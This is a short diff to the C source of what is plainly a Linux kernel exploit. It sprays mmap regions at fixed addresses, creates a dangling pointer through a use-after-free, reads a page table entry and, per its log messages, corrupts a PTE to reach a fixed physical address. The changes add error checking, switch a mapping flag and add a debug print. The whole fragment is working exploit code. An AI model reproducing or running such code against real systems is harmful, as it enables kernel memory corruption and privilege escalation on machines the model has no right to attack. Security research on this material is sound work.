@@ -70,8 +70,8 @@ int main(int argc, char *argv[]) {
   lstage("START");
 
   for (int i = 0; i < N_SPRAY; i++)
-    spray[i] = mmap((void *)(0xdead000000 + i * 0x2000 * PAGES), 0x1000 * PAGES,
-                    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+    spray[i] = SYSCHK(mmap((void *)(0xdead000000 + i * 0x2000 * PAGES), 0x1000 * PAGES,
+                    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
 
   linfo("create dangeling ptr");
   void *keap_ptrs[VULN_SPRAY] = {0};
@@ -96,6 +96,7 @@ int main(int argc, char *argv[]) {
 #endif
 
   keap_read(keap_ptr, &pte, 0x8);
+  lhex(pte);
   CHK((char)pte == 0x67);
 
   linfo("corrupt PTE using UAF with fixed physical address");
